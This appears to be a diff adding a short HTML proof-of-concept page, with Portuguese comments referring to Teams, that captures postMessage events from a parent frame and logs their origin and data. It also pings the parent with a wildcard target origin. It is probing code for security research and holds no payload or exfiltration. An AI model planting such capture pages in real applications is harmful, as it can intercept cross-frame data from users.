@@ -1,0 +1,24 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <title>PoC PostMessage Capture</title>
+</head>
+<body>
+  <h1>PostMessage Capture Active</h1>
+  <script>
+    window.addEventListener("message", function(event) {
+      console.log("📩 RECEIVED POSTMESSAGE");
+      console.log("🔹 Origin:", event.origin);
+      console.log("🔹 Data:", event.data);
+      console.log("🔹 Source:", event.source);
+
+      // Opcional: responder para o Teams
+      // event.source.postMessage("✅ PoC recebeu sua mensagem", event.origin);
+    });
+
+    // Tentar pingar o parent
+    console.log("📤 Enviando ping para window.parent...");
+    window.parent.postMessage("👋 hello from PoC iframe", "*");
+  </script>
+</body>
+</html>
